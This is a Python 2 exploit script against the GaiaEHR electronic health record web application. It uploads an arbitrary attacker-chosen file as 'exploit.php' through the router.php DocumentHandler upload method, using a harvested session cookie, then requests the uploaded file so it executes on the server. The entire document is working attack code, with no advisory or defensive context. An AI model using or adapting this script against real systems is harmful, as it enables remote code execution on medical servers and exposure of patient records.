#!/usr/bin/env python
#
# Usage: python exploit_gaiaehr_upload_vul.py [servername] [filename]
#

import json
import urllib2
import os
import re
import sys
argvs = sys.argv
sn = argvs[1]
fn = argvs[2]
f = open(fn,"r")
fstr = f.read()
try:
	initreq = urllib2.Request('http://' + sn + '/gaiaehr/')
	gets = urllib2.urlopen(initreq)
except:
	print "ERROR:May be...server down"
initck = gets.info().headers[3].split()[1]
print "init cookie is " + initck
upurl = 'http://' + sn + '/gaiaehr/data/router.php'
heders = {'Origin':'http://' + sn,
	  'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
	  'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundarydbcNA7VqIjRyq2pt',
	  'Referer':'http://' + sn + '/gaiaehr/',
	  'Cookie':initck,
	 }
boundary= "------WebKitFormBoundarydbcNA7VqIjRyq2pt\r\n"
setpid = 'Content-Disposition: form-data; name="pid"\r\n\r\n1\r\n'
setdoc = 'Content-Disposition: form-data; name="docType"\r\n\r\nUploadDoc\r\n'
fileup = 'Content-Disposition: form-data; name="filePath"; filename="exploit.php"\r\nContent-Type: text/php\r\n\r\n' + fstr + '\n\r\n'
dochandler = 'Content-Disposition: form-data; name="extAction"\r\n\r\nDocumentHandler\r\n'
updoc = 'Content-Disposition: form-data; name="extMethod"\r\n\r\nuploadDocument\r\n'
data = boundary + setpid + boundary + setdoc + boundary + fileup + boundary + dochandler + boundary + updoc + boundary

upopen = urllib2.Request(upurl,data,heders)
respon = urllib2.urlopen(upopen)
textlog  = respon.read()
print "#################LOG####################"
print textlog
print "########################################"
if bool(re.search("true",textlog)):
	filename = re.search(r'\d+\.php',textlog).group()
	print ">>>>>>>>UPLOAD SUCCESS AS " + filename
else:	
	print "ERROR:Server error,while exec shell command"
#now..... access

acurl = "http://" + sn + "/gaiaehr/sites/default/patients/1/uploaddoc/" + filename
print acurl
reqfin = urllib2.Request(acurl)
execphp = urllib2.urlopen(reqfin)
print execphp.read()
